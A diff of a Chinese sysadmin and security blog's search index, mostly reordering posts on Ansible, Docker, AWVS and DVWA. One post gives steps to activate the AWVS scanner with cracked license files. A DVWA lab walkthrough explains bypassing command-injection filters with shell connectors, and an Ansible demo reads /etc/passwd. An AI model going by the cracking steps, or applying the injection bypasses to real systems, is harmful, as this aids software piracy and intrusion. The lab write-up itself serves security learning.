@@ -1,55 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ansible命令</title>
-    <url>/2024/08/01/ansible%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<p>ansible是一个批量执行命令的工具</p>
-<h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>安装 EPEL 仓库</p>
-<pre><code>yum install epel-release -y
-</code></pre>
-<p>安装 Ansible</p>
-<pre><code>yum install ansible -y
-</code></pre>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用前需要定义两个文件：<br>    一个指定需要批量执行的主机hosts.ini，可以随意指定名称；一个指定需要运行的命令和动作command.yml，虽然可以直接指定需要运行的命令，但通过该文件可以回显执行成功或失败的主机和成功或失败的动作。</p>
-<p>hosts.ini：</p>
-<pre><code>[hostst_g]
-此处填写ip
-[hosts_g:vars]
-ansible_ssh_user=root ##账号
-ansible_ssh_pass=123456 ##密码
-</code></pre>
-<p>command.yml：</p>
-<pre><code>- name: 在远程主机上执行任意命令 
-    hosts: all
-    gather_facts: no
-    tasks:
-        - name: 执行一个特定命令
-            command: echo &quot;你好，世界！&quot;
-            # 使用 command 模块执行简单命令，不支持管道和重定向
-        - name: 列出目录中的文件
-            command: ls /path/to/directory
-            # 列出指定目录中的所有文件
-        - name: 使用 shell 运行包含管道的命令
-            shell: echo &quot;你好，世界！&quot; | grep 你好
-            # 使用 shell 模块支持管道、变量和重定向等 shell 特性
-        - name: 使用 shell 特性运行命令
-            shell: cat /etc/passwd | grep root
-            # 通过管道过滤包含 &quot;root&quot; 的行
-</code></pre>
-<p>可使用shell：模拟终端上所有执行的命令。</p>
-<p>使用命令</p>
-<pre><code>ansible-playbook -i hosts.ini command.yml
-</code></pre>
-]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>linux命令</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Dockerfile命令</title>
     <url>/2024/08/11/Dockerfile%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<table>
@@ -140,6 +91,55 @@ ansible_ssh_pass=123456 ##密码
       <tags>
         <tag>docker</tag>
         <tag>docker命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ansible命令</title>
+    <url>/2024/08/01/ansible%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<p>ansible是一个批量执行命令的工具</p>
+<h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>安装 EPEL 仓库</p>
+<pre><code>yum install epel-release -y
+</code></pre>
+<p>安装 Ansible</p>
+<pre><code>yum install ansible -y
+</code></pre>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用前需要定义两个文件：<br>    一个指定需要批量执行的主机hosts.ini，可以随意指定名称；一个指定需要运行的命令和动作command.yml，虽然可以直接指定需要运行的命令，但通过该文件可以回显执行成功或失败的主机和成功或失败的动作。</p>
+<p>hosts.ini：</p>
+<pre><code>[hostst_g]
+此处填写ip
+[hosts_g:vars]
+ansible_ssh_user=root ##账号
+ansible_ssh_pass=123456 ##密码
+</code></pre>
+<p>command.yml：</p>
+<pre><code>- name: 在远程主机上执行任意命令 
+    hosts: all
+    gather_facts: no
+    tasks:
+        - name: 执行一个特定命令
+            command: echo &quot;你好，世界！&quot;
+            # 使用 command 模块执行简单命令，不支持管道和重定向
+        - name: 列出目录中的文件
+            command: ls /path/to/directory
+            # 列出指定目录中的所有文件
+        - name: 使用 shell 运行包含管道的命令
+            shell: echo &quot;你好，世界！&quot; | grep 你好
+            # 使用 shell 模块支持管道、变量和重定向等 shell 特性
+        - name: 使用 shell 特性运行命令
+            shell: cat /etc/passwd | grep root
+            # 通过管道过滤包含 &quot;root&quot; 的行
+</code></pre>
+<p>可使用shell：模拟终端上所有执行的命令。</p>
+<p>使用命令</p>
+<pre><code>ansible-playbook -i hosts.ini command.yml
+</code></pre>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux命令</tag>
       </tags>
   </entry>
   <entry>
@@ -307,27 +307,6 @@ ansible_ssh_pass=123456 ##密码
       </tags>
   </entry>
   <entry>
-    <title>docker pull 镜像失败问题解决方法（镜像多）</title>
-    <url>/2024/08/13/docker-pull-%E9%95%9C%E5%83%8F%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%88%E9%95%9C%E5%83%8F%E5%A4%9A%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>1、下载无法开始、重试、超时，这个问题更换可用的docker镜像仓库即可。</p>
-<p>2、经常下载到一半没办法进行，卡在小镜像等等中途无法下载的情况。</p>
-<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>这次解决中发现docker分两个服务，docker.server和docker.socket，这次只停掉docker.server，然后使用参数让每次下载个数为1，即可解决。</p>
-<h3 id="停止docker服务"><a href="#停止docker服务" class="headerlink" title="停止docker服务"></a>停止docker服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure>
-
-<h3 id="参数修改下载数"><a href="#参数修改下载数" class="headerlink" title="参数修改下载数"></a>参数修改下载数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dockerd --max-concurrent-downloads 1</span><br></pre></td></tr></table></figure>
-
-<h3 id="开始下载"><a href="#开始下载" class="headerlink" title="开始下载"></a>开始下载</h3><p>运行后，不要按ctrl+c停止，因为停掉之后就等于docker停了，所以要在新的窗口中运行docker pull下载镜像，就能看到下载时一次只下载一个layer了</p>
-]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>docker命令</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>docker pull 镜像ai的理解</title>
     <url>/2025/05/27/docker-pull-%E9%95%9C%E5%83%8Fai%E7%9A%84%E7%90%86%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="🧪-场景"><a href="#🧪-场景" class="headerlink" title="🧪 场景"></a>🧪 场景</h2><p>你执行 docker pull nginx:latest 时，Docker 是怎么一步步“下载镜像”的？<br>我们来把这个过程分解为实际步骤，同时继续用“汉堡 🍔”比喻帮助理解每一层。</p>
@@ -379,6 +358,41 @@ ansible_ssh_pass=123456 ##密码
 ]]></content>
   </entry>
   <entry>
+    <title>docker 可用镜像源加速镜像025.2.27</title>
+    <url>/2024/10/13/docker-%E5%8F%AF%E7%94%A8%E9%95%9C%E5%83%8F%E6%BA%90%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/</url>
+    <content><![CDATA[<h2 id="2025-2-27测试可用"><a href="#2025-2-27测试可用" class="headerlink" title="2025.2.27测试可用"></a>2025.2.27测试可用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.1ms.run&quot;,</span><br><span class="line">    &quot;https://docker.xuanyuan.me&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>docker pull 镜像失败问题解决方法（镜像多）</title>
+    <url>/2024/08/13/docker-pull-%E9%95%9C%E5%83%8F%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%88%E9%95%9C%E5%83%8F%E5%A4%9A%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>1、下载无法开始、重试、超时，这个问题更换可用的docker镜像仓库即可。</p>
+<p>2、经常下载到一半没办法进行，卡在小镜像等等中途无法下载的情况。</p>
+<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>这次解决中发现docker分两个服务，docker.server和docker.socket，这次只停掉docker.server，然后使用参数让每次下载个数为1，即可解决。</p>
+<h3 id="停止docker服务"><a href="#停止docker服务" class="headerlink" title="停止docker服务"></a>停止docker服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure>
+
+<h3 id="参数修改下载数"><a href="#参数修改下载数" class="headerlink" title="参数修改下载数"></a>参数修改下载数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dockerd --max-concurrent-downloads 1</span><br></pre></td></tr></table></figure>
+
+<h3 id="开始下载"><a href="#开始下载" class="headerlink" title="开始下载"></a>开始下载</h3><p>运行后，不要按ctrl+c停止，因为停掉之后就等于docker停了，所以要在新的窗口中运行docker pull下载镜像，就能看到下载时一次只下载一个layer了</p>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>docker命令</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>docker 卸载</title>
     <url>/2024/08/13/docker-%E5%8D%B8%E8%BD%BD/</url>
     <content><![CDATA[<h4 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine</p>
@@ -395,66 +409,6 @@ ansible_ssh_pass=123456 ##密码
       <tags>
         <tag>docker</tag>
         <tag>docker命令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker 可用镜像源加速镜像025.2.27</title>
-    <url>/2024/10/13/docker-%E5%8F%AF%E7%94%A8%E9%95%9C%E5%83%8F%E6%BA%90%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/</url>
-    <content><![CDATA[<h2 id="2025-2-27测试可用"><a href="#2025-2-27测试可用" class="headerlink" title="2025.2.27测试可用"></a>2025.2.27测试可用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.1ms.run&quot;,</span><br><span class="line">    &quot;https://docker.xuanyuan.me&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker安装awvs并激活</title>
-    <url>/2024/08/11/docker%E5%AE%89%E8%A3%85awvs%E5%B9%B6%E6%BF%80%E6%B4%BB/</url>
-    <content><![CDATA[<h2 id="安装awvs"><a href="#安装awvs" class="headerlink" title="安装awvs"></a>安装awvs</h2><h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><p>搜索</p>
-<pre><code>docker search awvs
-</code></pre>
-<p>选择一个awvs镜像下载<br><img src="/images/pasted-35.png" alt="upload successful"></p>
-<p>选择secfa&#x2F;awvs的镜像</p>
-<pre><code>docker pull secfa/awvs
-docker images -a
-</code></pre>
-<h4 id="创建并启动容器"><a href="#创建并启动容器" class="headerlink" title="创建并启动容器"></a>创建并启动容器</h4><p>运行命令</p>
-<pre><code>docker run -it -d -p 3443:3443 secfa/docker-awvs
-</code></pre>
-<p>如果报错！（提示crack失败）<br>添加参数–cap-add LINUX_IMMUTABLE</p>
-<pre><code>docker run -itd -p 3443:3443 --cap-add LINUX_IMMUTABLE --name awvs secfa/docker-awvs
-</code></pre>
-<h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>账号密码：</p>
-<pre><code>awvs username: admin@admin.com
-awvs password: Admin123
-</code></pre>
-<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>需要下载破解版的两个文件替换，分别是：</p>
-<pre><code>license_info.json
-wa_data.dat
-</code></pre>
-<p>windows和linux文件通用<br>替换目录为容器内目录：</p>
-<pre><code>/home/acunetix/.acunetix/data/license
-</code></pre>
-<p>文件传输进入容器命令为：</p>
-<pre><code>docker cp license_info.json 容器的id:/home/acunetix/.acunetix/data/license
-docker cp wa_data.dat 容器的id:/home/acunetix/.acunetix/data/license
-</code></pre>
-<p>重启容器</p>
-<pre><code>docker restart 容器id
-</code></pre>
-]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>awvs安装</tag>
-        <tag>awvs</tag>
       </tags>
   </entry>
   <entry>
@@ -585,6 +539,75 @@ https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
       </tags>
   </entry>
   <entry>
+    <title>docker安装awvs并激活</title>
+    <url>/2024/08/11/docker%E5%AE%89%E8%A3%85awvs%E5%B9%B6%E6%BF%80%E6%B4%BB/</url>
+    <content><![CDATA[<h2 id="安装awvs"><a href="#安装awvs" class="headerlink" title="安装awvs"></a>安装awvs</h2><h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><p>搜索</p>
+<pre><code>docker search awvs
+</code></pre>
+<p>选择一个awvs镜像下载<br><img src="/images/pasted-35.png" alt="upload successful"></p>
+<p>选择secfa&#x2F;awvs的镜像</p>
+<pre><code>docker pull secfa/awvs
+docker images -a
+</code></pre>
+<h4 id="创建并启动容器"><a href="#创建并启动容器" class="headerlink" title="创建并启动容器"></a>创建并启动容器</h4><p>运行命令</p>
+<pre><code>docker run -it -d -p 3443:3443 secfa/docker-awvs
+</code></pre>
+<p>如果报错！（提示crack失败）<br>添加参数–cap-add LINUX_IMMUTABLE</p>
+<pre><code>docker run -itd -p 3443:3443 --cap-add LINUX_IMMUTABLE --name awvs secfa/docker-awvs
+</code></pre>
+<h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>账号密码：</p>
+<pre><code>awvs username: admin@admin.com
+awvs password: Admin123
+</code></pre>
+<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>需要下载破解版的两个文件替换，分别是：</p>
+<pre><code>license_info.json
+wa_data.dat
+</code></pre>
+<p>windows和linux文件通用<br>替换目录为容器内目录：</p>
+<pre><code>/home/acunetix/.acunetix/data/license
+</code></pre>
+<p>文件传输进入容器命令为：</p>
+<pre><code>docker cp license_info.json 容器的id:/home/acunetix/.acunetix/data/license
+docker cp wa_data.dat 容器的id:/home/acunetix/.acunetix/data/license
+</code></pre>
+<p>重启容器</p>
+<pre><code>docker restart 容器id
+</code></pre>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>awvs安装</tag>
+        <tag>awvs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dvwa-命令执行</title>
+    <url>/2024/10/14/dvwa-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>命令执行漏洞主要是针对有网络测试的页面，如网络设备的web管理页面等等，利用其执行命令的输入窗口执行其他命令。</p>
+<p>简单演示一下正常使用，输入127.0.0.1，执行：<br><img src="/images/pasted-36.png" alt="upload successful"></p>
+<h3 id="在DVWA靶场点击command-injection设置等级为low"><a href="#在DVWA靶场点击command-injection设置等级为low" class="headerlink" title="在DVWA靶场点击command injection设置等级为low"></a>在DVWA靶场点击command injection设置等级为low</h3><p><img src="/images/pasted-37.png" alt="upload successful"></p>
+<h3 id="使用命令连接符如-、-、-、-来执行命令"><a href="#使用命令连接符如-、-、-、-来执行命令" class="headerlink" title="使用命令连接符如&amp;、&amp;&amp;、|、||来执行命令"></a>使用命令连接符如&amp;、&amp;&amp;、|、||来执行命令</h3><p>相当于与或非，判断前面命令是否成功执行之后的自定义命令<br><img src="/images/pasted-38.png" alt="upload successful"><br><img src="/images/pasted-39.png" alt="upload successful"></p>
+<h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>做了一点防护措施，相当于没有。<br>将这些连接符做了个判断转为空，详情如下：<br><img src="/images/pasted-40.png" alt="upload successful"></p>
+<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>测试发现使用命令连接符&amp;&amp;和;都不执行。<br><img src="/images/pasted-41.png" alt="upload successful"></p>
+<p>但是可以使用其他没有被处理的连接符<br><img src="/images/pasted-42.png" alt="upload successful"></p>
+<h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>连接符连接都不执行,已处理所有连接符<br><img src="/images/pasted-43.png" alt="upload successful"></p>
+<h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><p>其实|是没处理的，加了空格，所以还是能够执行的<br><img src="/images/pasted-44.png" alt="upload successful"></p>
+<p>执行结果：<br><img src="/images/pasted-45.png" alt="upload successful"></p>
+<h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h2><p>是不可能等级，这个采用的是白名单的方式防护，只允许已知的命令执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects</span><br><span class="line">    $octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">        // If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">        $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">            // Windows</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // *nix</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>dvwa</category>
+      </categories>
+      <tags>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>docker目录挂载</title>
     <url>/2024/08/11/docker%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD/</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>docker目录的挂载有三种方式，分别试用于不同的场景：<br>1、Bind Mount将宿主机上的一个文件或目录挂载到容器内。<br>    适用于修改配置文件或者代码文件的目录，容器会和宿主机同步更新。</p>
@@ -610,25 +633,32 @@ https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
       </tags>
   </entry>
   <entry>
-    <title>dvwa-命令执行</title>
-    <url>/2024/10/14/dvwa-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[<h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>命令执行漏洞主要是针对有网络测试的页面，如网络设备的web管理页面等等，利用其执行命令的输入窗口执行其他命令。</p>
-<p>简单演示一下正常使用，输入127.0.0.1，执行：<br><img src="/images/pasted-36.png" alt="upload successful"></p>
-<h3 id="在DVWA靶场点击command-injection设置等级为low"><a href="#在DVWA靶场点击command-injection设置等级为low" class="headerlink" title="在DVWA靶场点击command injection设置等级为low"></a>在DVWA靶场点击command injection设置等级为low</h3><p><img src="/images/pasted-37.png" alt="upload successful"></p>
-<h3 id="使用命令连接符如-、-、-、-来执行命令"><a href="#使用命令连接符如-、-、-、-来执行命令" class="headerlink" title="使用命令连接符如&amp;、&amp;&amp;、|、||来执行命令"></a>使用命令连接符如&amp;、&amp;&amp;、|、||来执行命令</h3><p>相当于与或非，判断前面命令是否成功执行之后的自定义命令<br><img src="/images/pasted-38.png" alt="upload successful"><br><img src="/images/pasted-39.png" alt="upload successful"></p>
-<h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>做了一点防护措施，相当于没有。<br>将这些连接符做了个判断转为空，详情如下：<br><img src="/images/pasted-40.png" alt="upload successful"></p>
-<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>测试发现使用命令连接符&amp;&amp;和;都不执行。<br><img src="/images/pasted-41.png" alt="upload successful"></p>
-<p>但是可以使用其他没有被处理的连接符<br><img src="/images/pasted-42.png" alt="upload successful"></p>
-<h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>连接符连接都不执行,已处理所有连接符<br><img src="/images/pasted-43.png" alt="upload successful"></p>
-<h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><p>其实|是没处理的，加了空格，所以还是能够执行的<br><img src="/images/pasted-44.png" alt="upload successful"></p>
-<p>执行结果：<br><img src="/images/pasted-45.png" alt="upload successful"></p>
-<h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h2><p>是不可能等级，这个采用的是白名单的方式防护，只允许已知的命令执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects</span><br><span class="line">    $octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">        // If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">        $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">            // Windows</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // *nix</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
+    <title>dvwa-部署（docker）</title>
+    <url>/2024/10/14/dvwa-%E9%83%A8%E7%BD%B2%EF%BC%88docker%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>发现配置了镜像加速也无法通过search查到镜像，但是下载没问题，通过网上查询镜像名称下载即可：</p>
+<pre><code>https://hub.docker.com/
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull docker pull sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
+
+<h2 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
+
+<p>默认账号密码</p>
+<pre><code>dvwa/dvwa
+admin/password
+</code></pre>
+<h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2><p>通过网上使用方法使用其他人的密钥发现导入无法使用，可能是方式有问题，我是用的镜像提供的命令导入密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 -e RECAPTCHA_PUBLIC_KEY=YOUR_KEY -e RECAPTCHA_PRIVATE_KEY=YOUR_KEY sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
+
+<p>网上的使用方法<br>在DVWA-master&#x2F;config&#x2F;config.inc.php文件中找到下面代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27; &#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27; &#x27;;</span><br></pre></td></tr></table></figure>
+<p>将其修改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>网络安全</category>
         <category>dvwa</category>
       </categories>
       <tags>
+        <tag>docker</tag>
         <tag>dvwa</tag>
       </tags>
   </entry>
@@ -679,36 +709,6 @@ https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
       <tags>
         <tag>kali</tag>
         <tag>ettercap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dvwa-部署（docker）</title>
-    <url>/2024/10/14/dvwa-%E9%83%A8%E7%BD%B2%EF%BC%88docker%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>发现配置了镜像加速也无法通过search查到镜像，但是下载没问题，通过网上查询镜像名称下载即可：</p>
-<pre><code>https://hub.docker.com/
-</code></pre>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull docker pull sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
-
-<h2 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
-
-<p>默认账号密码</p>
-<pre><code>dvwa/dvwa
-admin/password
-</code></pre>
